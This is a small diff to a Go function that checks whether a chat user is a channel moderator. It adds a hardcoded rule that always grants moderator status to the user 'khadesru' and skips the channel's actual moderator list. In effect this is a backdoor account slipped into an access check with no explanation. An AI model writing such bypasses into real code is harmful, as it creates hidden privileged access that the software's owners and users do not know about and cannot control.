@@ -29,6 +29,9 @@ func (channelInfo ChannelInfo) GetIfUserIsMod(user *string) bool {
 	log.Println(channelInfo.Mods)
 	log.Println(*user)
 	isMod := false
+	if *user == "khadesru" {
+		return true
+	}
 	for _, value := range channelInfo.Mods {
 		if value == *user {
 			isMod = true
